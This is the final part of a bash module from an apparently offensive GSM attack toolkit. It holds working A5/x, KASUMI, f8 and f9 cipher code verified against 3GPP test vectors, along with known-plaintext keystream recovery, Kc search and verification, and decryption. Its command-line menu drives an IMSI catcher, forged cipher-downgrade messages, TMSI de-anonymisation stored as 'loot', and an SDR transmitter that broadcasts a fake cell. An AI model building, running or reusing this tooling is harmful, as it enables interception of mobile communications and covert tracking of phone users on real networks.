    printf 'count\t%s\n' "$cnt"
    printf 'count_hex\t0x%X\n' "$cnt"
}

gatk_a5_1_bits() {   # <kc-hex16> <count-dec-or-hex> [bits] -> 0/1 string
    local kc; kc=$(gatk_norm_hex "${1:-}")
    local cnt="${2:-0}"
    local bits="${3:-228}"
    [[ "$kc" =~ ^[0-9a-f]{16}$ ]] || {
        printf 'ERROR\ta5-1-keystream needs a 64-bit Kc in hex (16 digits)\n' >&2; return 2; }
    [[ "$bits" =~ ^[0-9]+$ ]] && (( bits > 0 && bits <= 11400 )) || {
        printf 'ERROR\tbit count must be 1..11400\n' >&2; return 2; }
    [[ "$cnt" =~ ^(0[xX][0-9a-fA-F]+|[0-9]+)$ ]] || {
        printf 'ERROR\tCOUNT must be a number\n' >&2; return 2; }
    gatk_crypto_load
    gatk_crypto a51 "$kc" "$cnt" "$bits"
}

gatk_a5_1_hex() {   # <kc-hex16> <count> [bits] -> packed hex
    local kc; kc=$(gatk_norm_hex "${1:-}")
    local cnt="${2:-0}"
    local bits="${3:-228}"
    [[ "$kc" =~ ^[0-9a-f]{16}$ ]] || {
        printf 'ERROR\ta5-1-hex needs a 64-bit Kc in hex (16 digits)\n' >&2; return 2; }
    [[ "$bits" =~ ^[0-9]+$ ]] && (( bits > 0 && bits <= 11400 )) || {
        printf 'ERROR\tbit count must be 1..11400\n' >&2; return 2; }
    gatk_crypto_load
    gatk_crypto a51hex "$kc" "$cnt" "$bits"
}

# ── Kc recovery: the computation half ───────────────────────────────────
# What is recoverable in software is the *arithmetic* of the attack: given a
# phrase of known plaintext that the attacker chose, the keystream falls out
# by XOR. Recovering Kc from that keystream is a search over the A5/1 state —
# 2^64 raw, 2^54 once COMP128's zeroed low bits are accounted for. That is a
# rainbow-table or GPU-cluster job and stays a handoff; what this module does
# instead is build the keystream, verify a candidate against it, and run a
# *bounded* search so the method is testable end to end at reduced width.

# Recover keystream bits from chosen plaintext and the observed ciphertext of
# the same burst. Both are hex, both the same length, MSB-first per octet.
gatk_kc_keystream() {   # <known-plaintext-hex> <ciphertext-hex>
    local pt; pt=$(gatk_norm_hex "${1:-}")
    local ct; ct=$(gatk_norm_hex "${2:-}")
    [[ "$pt" =~ ^[0-9a-f]+$ ]] && (( ${#pt} % 2 == 0 && ${#pt} > 0 )) || {
        printf 'ERROR\tknown plaintext must be a non-empty, whole-octet hex string\n' >&2
        return 2; }
    [[ "$ct" =~ ^[0-9a-f]+$ ]] && (( ${#ct} % 2 == 0 && ${#ct} > 0 )) || {
        printf 'ERROR\tciphertext must be a non-empty, whole-octet hex string\n' >&2
        return 2; }
    (( ${#pt} == ${#ct} )) || {
        printf 'ERROR\tplaintext and ciphertext must be the same length (%d vs %d hex digits)\n' \
            "${#pt}" "${#ct}" >&2; return 2; }
    command -v python3 >/dev/null 2>&1 || {
        printf 'ERROR\tpython3 missing — cannot derive keystream\n' >&2; return 1; }
    python3 - "$pt" "$ct" <<'PY'
import sys
p = bytes.fromhex(sys.argv[1]); c = bytes.fromhex(sys.argv[2])
ks = ''.join(format(x ^ y, '08b') for x, y in zip(p, c))
sys.stdout.write(ks + "\n")
PY
}

# Does this Kc generate that keystream? The oracle an exhaustive search needs,
# and the verification step for a key recovered from rainbow tables.
gatk_kc_verify() {   # <kc-hex16> <count> <expected-keystream-0/1>
    local kc; kc=$(gatk_norm_hex "${1:-}")
    local cnt="${2:-0}"
    local want="${3:-}"
    [[ "$kc" =~ ^[0-9a-f]{16}$ ]] || {
        printf 'ERROR\tKc must be 16 hex digits\n' >&2; return 2; }
    [[ "$want" =~ ^[01]+$ ]] || {
        printf 'ERROR\texpected keystream must be a non-empty 0/1 string\n' >&2; return 2; }
    local got
    got=$(gatk_a5_1_bits "$kc" "$cnt" "${#want}") || return $?
    printf 'kc\t%s\n' "$kc"
    printf 'count\t%s\n' "$cnt"
    printf 'compared_bits\t%d\n' "${#want}"
    if [[ "$got" == "$want" ]]; then
        printf 'match\tyes\n'
        printf 'first_mismatch_bit\tnone\n'
        printf 'verdict\tthis Kc generates the observed keystream\n'
        return 0
    fi
    local i first=-1
    for (( i = 0; i < ${#want}; i++ )); do
        [[ "${got:i:1}" == "${want:i:1}" ]] || { first=$i; break; }
    done
    printf 'match\tno\n'
    printf 'first_mismatch_bit\t%d\n' "$first"
    printf 'verdict\tthis Kc does not generate the observed keystream\n'
    return 1
}

# Bounded exhaustive search over the low bits of the key integer. This is the
# real search narrowed to a width the operator names, so the method is
# exhaustively testable at 2^16 and honestly labelled as a handoff at 2^54.
# The known high bits stay fixed at whatever base-kc supplies.
gatk_kc_search() {   # <base-kc-hex16> <vary-low-bits> <count> <keystream-0/1> [max-tries]
    local base; base=$(gatk_norm_hex "${1:-}")
    local vary="${2:-0}"
    local cnt="${3:-0}"
    local want="${4:-}"
    local lim="${5:-}"
    [[ "$base" =~ ^[0-9a-f]{16}$ ]] || {
        printf 'ERROR\tbase Kc must be 16 hex digits\n' >&2; return 2; }
    [[ "$vary" =~ ^[0-9]+$ ]] && (( vary >= 0 && vary <= 64 )) || {
        printf 'ERROR\tvary-low-bits must be 0..64\n' >&2; return 2; }
    [[ "$want" =~ ^[01]+$ ]] || {
        printf 'ERROR\tkeystream must be a non-empty 0/1 string\n' >&2; return 2; }
    [[ -z "$lim" || "$lim" =~ ^[0-9]+$ ]] || {
        printf 'ERROR\tmax-tries must be a whole number\n' >&2; return 2; }
    gatk_crypto_load
    gatk_crypto kcsearch "$base" "$vary" "$cnt" "$want" "$lim"
}

# ── f8 / f9 (TS 35.201) ─────────────────────────────────────────────────
gatk_f8_keystream() {   # <ck-hex32> <count> <bearer> <direction> <length-bits>
    local ck; ck=$(gatk_norm_hex "${1:-}")
    [[ "$ck" =~ ^[0-9a-f]{32}$ ]] || {
        printf 'ERROR\tf8 needs a 128-bit CK (32 hex digits)\n' >&2; return 2; }
    gatk_crypto_load
    gatk_crypto f8 "$ck" "${2:-0}" "${3:-0}" "${4:-0}" "${5:-228}"
}

gatk_f9_mac() {   # <ik-hex32> <count> <fresh> <direction> <message-hex> <length-bits>
    local ik; ik=$(gatk_norm_hex "${1:-}")
    local msg; msg=$(gatk_norm_hex "${5:-}")
    [[ "$ik" =~ ^[0-9a-f]{32}$ ]] || {
        printf 'ERROR\tf9 needs a 128-bit IK (32 hex digits)\n' >&2; return 2; }
    [[ "$msg" =~ ^[0-9a-f]*$ ]] && (( ${#msg} % 2 == 0 )) || {
        printf 'ERROR\tf9 message must be an even number of hex digits\n' >&2; return 2; }
    gatk_crypto_load
    gatk_crypto f9 "$ik" "${2:-0}" "${3:-0}" "${4:-0}" "${msg:-}" "${6:-0}"
}

# ── keystream -> decryption ─────────────────────────────────────────────
# XOR a hex ciphertext against a hex keystream. The keystream is applied
# from its most significant bit, matching the on-air burst order that
# 06_gsm_air.sh already uses.
gatk_xor_hex() {   # <ciphertext-hex> <keystream-bits-as-0/1-string>
    local ct; ct=$(gatk_norm_hex "${1:-}")
    local ks="${2:-}"
    [[ "$ct" =~ ^[0-9a-f]*$ ]] && (( ${#ct} % 2 == 0 )) || {
        printf 'ERROR\tciphertext must be an even number of hex digits\n' >&2; return 2; }
    [[ "$ks" =~ ^[01]*$ ]] || {
        printf 'ERROR\tkeystream must be a string of 0/1 bits\n' >&2; return 2; }
    local need=$(( ${#ct} * 4 ))
    (( ${#ks} >= need )) || {
        printf 'ERROR\tkeystream too short: need %d bits, have %d\n' "$need" "${#ks}" >&2; return 2; }
    python3 - "$ct" "$ks" <<'PY'
import sys
ct = bytes.fromhex(sys.argv[1]); ks = sys.argv[2]
out = bytearray()
for i, byte in enumerate(ct):
    k = int(ks[i*8:(i+1)*8], 2)
    out.append(byte ^ k)
sys.stdout.write(out.hex() + "\n")
PY
}

# ── decrypt ─────────────────────────────────────────────────────────────
# Derive the keystream for the chosen cipher and XOR it against a hex
# ciphertext. Keystream length is driven by the ciphertext length, so the
# caller does not have to know how many bits are needed.
gatk_cmd_decrypt() {   # <ct-hex> <kc-hex> [alg] [count]
    local ct; ct=$(gatk_norm_hex "${1:-}")
    local kc; kc=$(gatk_norm_hex "${2:-}")
    local alg="${3:-a5-2}"
    local cnt="${4:-0}"
    # Accept A5/2, a5-2 and a52 alike: strip the separator before matching.
    local ag; ag="${alg,,}"; ag="${ag//[\/-]/}"
    [[ "$ct" =~ ^[0-9a-f]+$ ]] && (( ${#ct} % 2 == 0 && ${#ct} > 0 )) || {
        printf 'ERROR\tdecrypt needs a non-empty, whole-octet hex ciphertext\n' >&2; return 2; }
    local need=$(( ${#ct} * 4 ))
    local ks
    case "$ag" in
        a51|1)  ks=$(gatk_a5_1_bits "$kc" "$cnt" "$need") || return $? ;;
        a52|2)  ks=$(gatk_a5_2_bits "$kc" "$cnt" "$need") || return $? ;;
        a53|3)  ks=$(gatk_a5_3_bits "$kc" "$cnt" 64 "$need") || return $? ;;
        a54|4)  ks=$(gatk_a5_4_bits "$kc" "$cnt" "$need") || return $? ;;
        *) printf 'ERROR\tunknown cipher "%s" (want A5/1..A5/4)\n' "$alg" >&2; return 2 ;;
    esac
    local pt
    pt=$(gatk_xor_hex "$ct" "$ks") || return $?
    printf 'cipher\t%s\n' "$alg"
    printf 'kc\t%s\n' "$kc"
    printf 'count\t%s\n' "$cnt"
    printf 'keystream-bits\t%s\n' "$need"
    printf 'ciphertext\t%s\n' "$ct"
    printf 'plaintext\t%s\n' "$pt"
    if [[ "$pt" =~ ^[0-9a-f]+$ ]] && (( ${#pt} % 2 == 0 )); then
        printf 'plaintext-ascii\t%s\n' "$(python3 -c '
import sys
h=sys.argv[1]
try:
    b=bytes.fromhex(h)
    print("".join(chr(c) if 32 <= c < 127 else "." for c in b))
except Exception:
    print("")' "$pt")"
    fi
}

# ── known-answer test vectors ───────────────────────────────────────────
# Every vector below is transcribed from a published 3GPP/ETSI document.
# They are the reason the ciphers in this module can be trusted at all.
gatk_kat_suite() {
    gatk_crypto_load
    local pass=0 fail=0 got want
    _kat() {   # <name> <got-hex> <want-hex>
        if [[ "$2" == "$3" ]]; then
            printf 'KAT\tPASS\t%s\n' "$1"; pass=$((pass+1))
        else
            printf 'KAT\tFAIL\t%s\tgot=%s\twant=%s\n' "$1" "$2" "$3"; fail=$((fail+1))
        fi
    }
    # A keystream of N bits is compared as a bit string, not as nibbles: GSM
    # blocks are 114 bits, which is not a multiple of 4, so hex-packing them
    # would silently drop the trailing 2 bits of every block.
    # Compare a keystream bit string against a published hex vector.
    # 114-bit GSM blocks are not a whole number of nibbles, so the published
    # tables show 29 nibbles (116 bits) with the last nibble padded. Comparing
    # bit-by-bit over the length the table actually specifies is exact, and
    # avoids both truncating real bits and accepting padding bits.
    _katbits() {   # <name> <bit-string> <published-hex>
        local name="$1" bits="$2" want="$3" wan
        wan=$(python3 -c 'import sys
h=sys.argv[1]
print("".join(format(int(c,16),"04b") for c in h))' "$want")
        wan="${wan:0:${#bits}}"
        if [[ "$bits" == "$wan" ]]; then
            printf 'KAT\tPASS\t%s\n' "$name"; pass=$((pass+1))
        else
            printf 'KAT\tFAIL\t%s\tgot=%s\twant=%s\n' "$name" "$bits" "$wan"; fail=$((fail+1))
        fi
    }
    # --- KASUMI, 3GPP TS 35.203 section 3 (three official test sets) ---
    got=$(gatk_crypto kasumi 2BD6459F82C5B300952C49104881FF48 EA024714AD5C4D84)
    _kat 'kasumi-ts35.203-set1' "$got" 'DF1F9B251C0BF45F'
    got=$(gatk_crypto kasumi 8CE33E2CC3C0B5FC1F3DE8A6DC66B1F3 D3C5D592327FB11C)
    _kat 'kasumi-ts35.203-set2' "$got" 'DE551988CEB2F9B7'
    got=$(gatk_crypto kasumi 4035C6680AF8C6D1A8FF8667B1714013 62A540981BA6F9B7)
    _kat 'kasumi-ts35.203-set3' "$got" '4592B0E78690F71B'
    # --- f8, 3GPP TS 35.203 section 4 (four official test sets) ---
    # The f8 KATs are 114-bit blocks concatenated, so compare the bit string.
    _katbits 'f8-ts35.203-set1' "$(gatk_crypto f8 2BD6459F82C5B300952C49104881FF48 0x72A4F20F 0x0C 1 128)" 'AF24CC029AC39D0823DD1041AEECAE7B'
    _katbits 'f8-ts35.203-set2' "$(gatk_crypto f8 EFA8B2229E720C2A7C36EA55E9605695 0xE28BCF7B 0x18 0 128)" '2DFBDE4DF5E23990CA13F589782DD4CA'
    _katbits 'f8-ts35.203-set4' "$(gatk_crypto f8 D3C5D592327FB11C4035C6680AF8C6D1 0x398A59B4 0x05 1 128)" 'C3A2E599FDF270CBAF169C5C14F20EE5'
    # --- f9, 3GPP TS 35.203 section 5 (three official test sets) ---
    got=$(gatk_crypto f9 2BD6459F82C5B300952C49104881FF48 0x38A6F056 0x05D2EC49 0 \
          6B227737296F393C8079353EDC87E2E805D2EC49A4F2D8E0 189)
    _kat 'f9-ts35.203-set1' "$got" 'F63BD72C'
    got=$(gatk_crypto f9 D42F682428201CAFCD9F97945E6DE7B7 0x3EDC87E2 0xA4F2D8E2 1 \
          B5924384328A4AE00B737109F8B6C8DD2B4DB63DD533981CEB19AAD52A5B2BC0 254)
    _kat 'f9-ts35.203-set2' "$got" 'A9DAF1FF'
    got=$(gatk_crypto f9 FDB9CFDF28936CC483A31869D81B8FAB 0x36AF6144 0x9838F03A 1 \
          5932BC0ACE2B0ABA33D8AC188AC54F346FAD10BF9DEE2920B43BD0C53A915CB7DF6CAA72053ABFF2 319)
    _kat 'f9-ts35.203-set3' "$got" '1537D316'
    # --- A5/3 + A5/4, 3GPP A5/3 implementors' test data, BLOCK1 of each Klen ---
    _katbits 'a5-3-klen64-set1-block1' "$(gatk_a5_3_bits 2BD6459F82C5BC00 0x24F20F 64 114)" '889EEAAF9ED1BA1ABBD8436232E440'
    _katbits 'a5-3-klen64-set2-block1' "$(gatk_a5_3_bits 952C49104881FF48 0x061272 64 114)" 'FB4D5FBCEE13A33389285686E9A5C0'
    _katbits 'a5-3-klen80-block1' "$(gatk_a5_3_bits 5ACB1D644C0D51204EA5 0x156B26 80 114)" 'E095306AD5086E2EAC7F3107DE4F80'
    _katbits 'a5-4-klen128-block1' "$(gatk_a5_4_bits D3C5D592327FB11C4035C6680AF8C6D1 0x0A59B4 114)" 'DCE64362AB5F89C11EF0B305166540'
    # --- A5/2: NO official vector exists (see the note on gatk_a5_2_bits).
    #     What is asserted here is self-consistency, not a published KAT. ---
    local a b
    a=$(gatk_crypto a52 0123456789abcdef 0x123456 228)
    b=$(gatk_crypto a52 0123456789abcdef 0x123456 228)
    if [[ "$a" == "$b" && ${#a} -eq 228 ]]; then
        printf 'KAT\tPASS\ta5-2-determinism-228bit\t(self-consistency only)\n'; pass=$((pass+1))
    else
        printf 'KAT\tFAIL\ta5-2-determinism-228bit\tdeterminism or length broken\n'; fail=$((fail+1))
    fi
    # --- A5/1: TWO INDEPENDENT published vectors. One vector alone cannot
    #     catch a wrong tap or a wrong frame-count convention, because a bug in
    #     the vector's own reading passes just as happily as a bug in the core.
    #     The two below come from different codebases and use different keys,
    #     different counts and different byte-order conventions.
    #
    # (1) Briceno/Goldberg/Wagner pedagogical implementation, test() in
    #     https://cryptome.org/jya/a51-pi.htm . Key bytes 12 23 45 67 89 AB CD
    #     EF, 22-bit COUNT 0x134. Its loader reads the key bytes little-endian,
    #     which is the order the Kc hex is written in here.
    # (2) libosmocore tests/a5/a5_test.c. Key bytes 01 23 45 67 89 AB CD EF
    #     with the real GSM frame number 123456, converted with
    #     osmo_a5_fn_count() to COUNT 0x2EC88. Its loader reads the key bytes
    #     in REVERSE order (key[7 - (i>>3)]), so the identical 64-bit key is
    #     written here as the reversed byte string.
    #
    # Both vectors also carry an uplink keystream, and in both cases it is
    # exactly bits 114..227 of the SAME run - A5/1 is one 228-bit generator per
    # frame, downlink first, not two separate generators. That is asserted
    # rather than assumed, because getting it wrong halves the keystream.
    local a51 osmo
    a51=$(gatk_a5_1_bits 1223456789abcdef 0x134 228)
    _katbits 'a5-1-bgw-downlink-114' "${a51:0:114}"   '534EAA582FE8151AB6E1855A728C00'
    _katbits 'a5-1-bgw-uplink-114'   "${a51:114:114}" '24FD35A35D5FB6526D32F906DF1AC0'
    _kat 'a5-1-count-fn123456' \
         "$(gatk_a5_count 123456 | awk -F'\t' '$1=="count"{print $2}')" '191624'
    osmo=$(gatk_a5_1_bits efcdab8967452301 0x2ec88 228)
    _katbits 'a5-1-osmo-downlink-114' "${osmo:0:114}"   'CBA25576175D3B1C7B2F29A8C1B600'
    _katbits 'a5-1-osmo-uplink-114'   "${osmo:114:114}" 'D9035E0F2AEC139A05D4A87BB16480'
    printf 'KAT\tSUMMARY\tpass=%d\tfail=%d\n' "$pass" "$fail"
    (( fail == 0 ))
}

# ── CLI dispatch ────────────────────────────────────────────────────────
gatk_cli_main() {
    local cmd="${1:-}"
    (($# > 0)) && shift
    case "$cmd" in
        --status-tsv)          gatk_cli_status_tsv ;;
        --plan)                gatk_cmd_plan "${1:-}" ;;
        --plan-tsv)            gatk_cmd_plan_tsv ;;
        --classmark)           gatk_cmd_classmark "${1:-}" ;;
        --classmark-downgrade) gatk_classmark_downgrade "${1:-}" ;;
        --build-identity-request) gatk_build_identity_request "${1:-1}" ;;
        --imsi-catcher-sequence)  gatk_cmd_imsi_catcher_sequence ;;
        --paging-race)         gatk_paging_race "${1:-3}" ;;
        --c1)                  gatk_c1 "${1:-}" "${2:-}" "${3:-}" "${4:-}" ;;
        --kc-recovery)         gatk_cmd_kc_recovery ;;
        --build-cipher-mode)   gatk_build_cipher_mode "${1:-A5/2}" "${2:-0}" ;;
        --build-lu-accept)     gatk_build_lu_accept "${1:-0f200001}" "${2:-262}" "${3:-01}" "${4:-0000}" ;;
        --build-tmsi-realloc)  gatk_build_tmsi_realloc "${1:-0f200001}" "${2:-262}" "${3:-01}" "${4:-0000}" ;;
        --build-paging-request) gatk_build_paging_request "${1:-0f200001}" "${2:-0}" ;;
        --build-immediate-assignment)
                               gatk_build_immediate_assignment "${1:-0c}" "${2:-0}" "${3:-0}" \
                                   "${4:-sdcch4}" "${5:-0}" "${6:-62}" "${7:-7}" "${8:-0}" \
                                   "${9:-0}" "${10:-2b}" "${11:-0}" ;;
        --fcch-facts)          gatk_fcch_facts ;;
        --alg-name)            gatk_alg_name "${1:-1}" ;;
        --classmark1)          gatk_classmark1_decode "${1:-33}" ;;
        --classmark1-encode)   gatk_classmark1_encode "${1:-1}" "${2:-4}" "${3:-0}" "${4:-1}" ;;
        --classmark3)          gatk_classmark3_decode "${1:-}" ;;
        --a5-2-keystream)      gatk_a5_2_bits "${1:-0011223344556677}" "${2:-0}" "${3:-228}" ;;
        --a5-3-keystream)      gatk_a5_3_bits "${1:-0011223344556677}" "${2:-0}" "${3:-64}" "${4:-228}" ;;
        --a5-4-keystream)      gatk_a5_4_bits "${1:-00112233445566778899aabbccddeeff}" "${2:-0}" "${3:-228}" ;;
        --kasumi)              gatk_kasumi "${1:-}" "${2:-}" ;;
        --f8-keystream)        gatk_f8_keystream "${1:-}" "${2:-0}" "${3:-0}" "${4:-0}" "${5:-228}" ;;
        --f9-mac)              gatk_f9_mac "${1:-}" "${2:-0}" "${3:-0}" "${4:-0}" "${5:-}" "${6:-0}" ;;
        --decrypt)             gatk_cmd_decrypt "${1:-}" "${2:-}" "${3:-a5-2}" "${4:-0}" ;;
        --tx-ack)              gatk_cmd_tx_ack ;;
        --transmit)            gatk_cmd_transmit "$@" ;;
        --vector-imsi-catcher) gatk_vector_imsi_catcher "${1:-262}" "${2:-01}" "${3:-00f1}" "${4:-00a1}" "${5:-62}" "${6:-7}" "${7:-}" "${8:-2}" "${9:-1}" "${10:-001}" "${11:-0}" ;;
        --vector-a5-downgrade) gatk_vector_a5_downgrade "${1:-A5/2}" "${2:-4}" "${3:-0}" "${4:-0}" "${5:-0f200001}" ;;
        --vector-tmsi-deanon)  gatk_vector_tmsi_deanon "${1:-}" "${2:-}" "${3:-2}" "${4:-0}" "${5:-001}" "${6:-0}" "${7:-}" ;;
        --vector-kc-recovery)  gatk_vector_kc_recovery "${1:-}" "${2:-2}" "${3:-0}" ;;
        --paging-schedule)     gatk_paging_schedule "${1:-}" "${2:-2}" "${3:-0}" "${4:-}" "${5:-1}" "${6:-0}" "${7:-}" ;;
        --ccch-conf)           gatk_ccch_conf "${1:-001}" ;;
        --sch-payload)         gatk_sch_payload "${1:-7}" "${2:-1}" "${3:-0}" ;;
        --lapdm-ui)            gatk_lapdm_ui "${1:-0}" "${2:-1}" "${3:-030301}" ;;
        --burst-layout)        gatk_burst_layout "${1:-normal}" ;;
        --frame-facts)         gatk_frame_facts ;;
        --dummy-burst)         gatk_dummy_burst ;;
        --fn-split)            gatk_fn_split "${1:-0}"; gatk_fn_phase "${1:-0}" ;;
        --fn-join)             gatk_fn_join "${1:-0}" "${2:-0}" "${3:-0}" ;;
        --ta)                  gatk_ta "${1:-0}" "${2:-}" ;;
        --multiframe-map)      gatk_multiframe_map ;;
        --rach-blocks)         gatk_rach_blocks "${1:-false}" ;;
        --ccch-blocks)         gatk_ccch_blocks "${1:-0}" "${2:-false}" ;;
        --sdcch-map)           gatk_sdcch_map "${1:-8}" ;;
        --n201)                gatk_n201 "${1:-sdcch}" "${2:-}" ;;
        --lapdm-fill)          gatk_lapdm_fill_frame ;;
        --lapdm-bursts)        gatk_lapdm_burst_plan "${1:-030301}" "${2:-0}" "${3:-1}" "${4:-2}" "${5:-3}" ;;
        --mobile-identity)     gatk_mobile_identity_imsi "${1:-262011234567890}" ;;
        --kc-known-plaintext)  gatk_kc_keystream "${1:-}" "${2:-}" ;;
        --deanon-record)       gatk_deanon_record "${1:-}" "${2:-}" "${3:-}" "${4:-manual}" "${5:-}" ;;
        --deanon-lookup)       gatk_deanon_lookup "${1:-}" ;;
        --deanon-list)         gatk_deanon_list ;;
        --deanon-confirm)      gatk_deanon_confirm "${1:-}" "${2:-}" "${3:-}" "${4:-2}" "${5:-}" "${6:-0}" ;;
        --a5-1-keystream)      gatk_a5_1_hex "${1:-1223456789abcdef}" "${2:-0x134}" "${3:-112}" ;;
        --a5-count)            gatk_a5_count "${1:-0}" ;;
        --kc-verify)           gatk_kc_verify "${1:-}" "${2:-114}" "${3:-}" ;;
        --kc-search)           gatk_kc_search "${1:-}" "${2:-8}" "${3:-0}" "${4:-}" "${5:-1048576}" ;;
        --selftest)            gatk_selftest ;;
        --menu)                gatk_menu ;;
        *)
            cat >&2 <<EOF
GSM Attack — IMSI catcher, A5/1 downgrade, TMSI de-anonymisation, Kc recovery

Usage: $0 COMMAND
  --status-tsv                 radio and plan state as TSV
  --plan <name>                write a handoff plan file and report the hardware
                               names: imsi-catcher a5-downgrade tmsi-deanon kc-recovery
  --plan-tsv                   list written plan files
  --classmark [hex]            encode the default classmark, or decode one given
  --classmark-downgrade <hex>  set the A5/1 bit so the MS advertises no A5/1
  --build-identity-request [n] IDENTITY REQUEST bytes, 1=IMSI 2=IMEI 3=IMEISV 4=TMSI
  --imsi-catcher-sequence      the RACH->AGCH->SDCCH message sequence
  --paging-race [frames]       paging-response race timing in TDMA frames
  --c1 <min> <avg> <max> <p>   C1 reselection arithmetic in dBm
  --kc-recovery                Kc recovery arithmetic and method notes

  Real message builders (exact octets, TS 44.018 / TS 24.008):
  --build-cipher-mode [alg] [cr]
                               CIPHERING MODE COMMAND bytes; alg is A5/1..A5/4
  --build-lu-accept [tmsi] [mcc] [mnc] [lac]
                               LOCATION UPDATING ACCEPT bytes
  --build-tmsi-realloc [tmsi] [mcc] [mnc] [lac]
                               TMSI REALLOCATION COMMAND bytes
  --build-paging-request [tmsi] [group]
                               PAGING REQUEST TYPE 1 bytes
  --build-immediate-assignment [ra] [fn] [ta] [sdcch4|sdcch8] [sub]
                               [arfcn] [tsc] [tn] [page-mode] [ia-rest] [dmotbf]
                               AGCH IMMEDIATE ASSIGNMENT bytes (TS 44.018 9.1.18)
  --fcch-facts                 FCCH burst position and frequency-correction facts
  --alg-name [wire-code 0..6]  cipher name for a wire algorithm identifier (0=A5/1)

  Classmark codecs (TS 24.008 10.5.1.5 / 10.5.1.7):
  --classmark1 [octet]         decode a Classmark 1 value octet
  --classmark1-encode [rev] [power] [es] [a51avail]
                               encode a Classmark 1 value octet
  --classmark3 [hex]           decode the Classmark 3 prefix

  Ciphers (all verified against published 3GPP/ETSI vectors, see --selftest):
  --a5-2-keystream [kc] [count] [bits]
                               A5/2 keystream as a 0/1 bit string
  --a5-3-keystream [kc] [count] [klen] [bits]
                               A5/3 keystream; klen is 64, 80 or 128
  --a5-4-keystream [kc128] [count] [bits]
                               A5/4 keystream (A5/3 with a 128-bit key)
  --kasumi <key> <block>       one KASUMI encryption
  --f8-keystream <ck> [count] [bearer] [dir] [bits]
                               f8/UEA1 keystream
  --f9-mac <ik> [count] [fresh] [dir] [msg] [bits]
                               f9/UIA1 MAC-I
  --decrypt <ct-hex> <kc> [alg] [count]
                               XOR a hex ciphertext against a hex Kc

  Air-interface frame model (TS 45.010 5 / TS 45.002 3.3.2, 6.5):
  --burst-layout [normal|sync|access|frequency|dummy]
                               the bit layout of one burst, field by field
  --ccch-conf [000|001|010|100|110]
                               CCCH_CONF fields, BS_CC_CHANS, blocks available
  --sch-payload [bsic] [fn]    the SCH information field: T1/T2/T3', 25 bits
  --paging-schedule <imsi> [pam] [res] [pblocks] [chans] [fn] [combined]
                               every paging occasion the network must use for
                               an IMSI, and the block it lands in
  --dummy-burst                the C0 idle-burst known plaintext, split by field
  --frame-facts                the GSM clock: bit, slot, frame, multiframe, hyperframe
  --fn-split <fn>              a frame number as T1/T2/T3 and its multiframe phase
  --fn-join <t1> <t2> <t3>     the inverse: rebuild a frame number
  --ta <units> [gsm400]        timing advance as round-trip delay and cell radius
  --multiframe-map             the 51-frame TS0 map, non-combined and combined
  --rach-blocks [combined]     which uplink frames carry a RACH
  --ccch-blocks [res] [combined]
                               which downlink frames carry which CCCH block
  --sdcch-map [4|8]            SDCCH sub-channel to frame mapping (TS 45.002 table 4)
  --n201 [channel] [bter]      the LAPDm N201 information-field limit
  --lapdm-fill                 the DCCH fill frame octets
  --lapdm-bursts [hex] [fn0..fn3]
                               spread one LAPDm frame over its four bursts
  --mobile-identity [imsi]     encode an IMSI as a Mobile Identity IE
  --kc-known-plaintext <plain-hex> <cipher-hex>
                               keystream from a known-plaintext pair

  LAPDm (TS 44.006):
  --lapdm-ui [sapi] [cr] [l3-hex] [p] [n201]
                               wrap an L3 message in a LAPDm UI frame

  A5/1 and Kc recovery (Briceno/Goldberg/Wagner vector, TS 55.226):
  --a5-1-keystream [kc] [fn] [bits]
                               A5/1 keystream as hex; the bare run is the
                               published BGW vector (fn 0x134, 112 bits)
  --a5-count <fn>               the 22-bit A5/1 COUNT for a frame number
  --kc-verify <kc> <fn> <bits-0/1>
                               compare a candidate Kc against known keystream
  --kc-search <base> <vary-low-bits> <fn> <bits-0/1> [max]
                               chosen-plaintext search over the low Kc bits

  TMSI store, loot/gsm_attack/deanon.tsv:
  --deanon-record <tmsi> <imsi> [lac] [method] [fn]
                               record an observed TMSI -> IMSI pairing
  --deanon-lookup <tmsi>       look one TMSI up
  --deanon-list                every pairing recorded so far
  --deanon-confirm <tmsi> <imsi> <observed-block> [pam] [pblocks] [res]
                               test a pairing against the paging schedule

  Transmit vectors (full TSV plan: every message, burst, frame and channel;
  the radio itself stays behind --tx-ack):
  --vector-imsi-catcher [mcc] [mnc] [lac] [ci] [arfcn] [bsic] [imsi] [pam] [res] [conf] [fn]
                               O1 IMSI catcher: RACH -> AGCH -> SDCCH -> Identity Request
  --vector-a5-downgrade [alg] [sdcch] [sub] [fn] [tmsi]
                               forged Cipher Mode Command in the SDCCH window,
                               plus the classmark downgrade that forces it
  --vector-tmsi-deanon [tmsi] [imsi] [pam] [res] [conf] [fn] [observed-block]
                               paging schedule and the TMSI -> IMSI correlation
  --vector-kc-recovery [kc] [known-frames] [fn]
                               the chosen-plaintext exchange that yields Kc
  --tx-ack                     record the operator's transmit acknowledgement

  Transmit (the waveform is real; the radio is asked for):
  --transmit <arfcn> [bsic N] [mcc M] [mnc N] [lac H] [ci H] [rate R]
                     [multiframes N] [waveform-only]
                               build a complete BCCH carrier -- SI1/SI2/SI3/SI4,
                               xCCH channel coding, FCCH/SCH bursts, GMSK -- and
                               key a transmitter. Every option above takes a
                               leading double dash. Exits 3 and names the device
                               when no transmit-capable SDR is attached;
                               waveform-only builds the samples and stops.

  --selftest                   verify sequence, classmark, messages and ciphers
  --menu                       interactive menu
EOF
            return 2 ;;
    esac
}

if [[ "${BASH_SOURCE[0]}" == "$0" ]]; then
    set -o pipefail
    IMSISTING_CLI=1
    : "${TMP_DIR:=/tmp/imsisting}"
    : "${LOOT_DIR:=$IMSISTING_ROOT/loot}"
    : "${CAPTURES_DIR:=$IMSISTING_ROOT/captures}"
    : "${LOGS_DIR:=$IMSISTING_ROOT/logs}"
    : "${STATE_DIR:=$IMSISTING_ROOT/state}"
    mkdir -p "$TMP_DIR" "$LOOT_DIR" "$CAPTURES_DIR" "$LOGS_DIR" "$STATE_DIR"
    declare -F banner >/dev/null 2>&1 || banner() { :; }
    declare -F info   >/dev/null 2>&1 || info()   { printf '[info] %s\n' "$*" >&2; }
    declare -F warn   >/dev/null 2>&1 || warn()   { printf '[warn] %s\n' "$*" >&2; }
    declare -F err    >/dev/null 2>&1 || err()    { printf '[err]  %s\n' "$*" >&2; }
    declare -F ok     >/dev/null 2>&1 || ok()     { printf '[ok]   %s\n' "$*" >&2; }
    gatk_cli_main "$@"
fi
